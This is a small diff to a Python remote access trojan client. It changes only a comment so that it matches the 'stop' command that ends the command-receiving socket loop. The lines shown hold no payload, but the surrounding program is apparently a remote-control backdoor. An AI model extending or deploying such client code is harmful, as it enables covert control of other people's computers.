@@ -22,7 +22,7 @@ while True:
         command = s.recv(4096)
         command = command.decode("UTF-8")
 
-        #exit the session if the RAT server enters "quit"
+        #exit the session if the RAT server enters "stop"
         if command == "stop":
             print("Exiting connection...")
             break
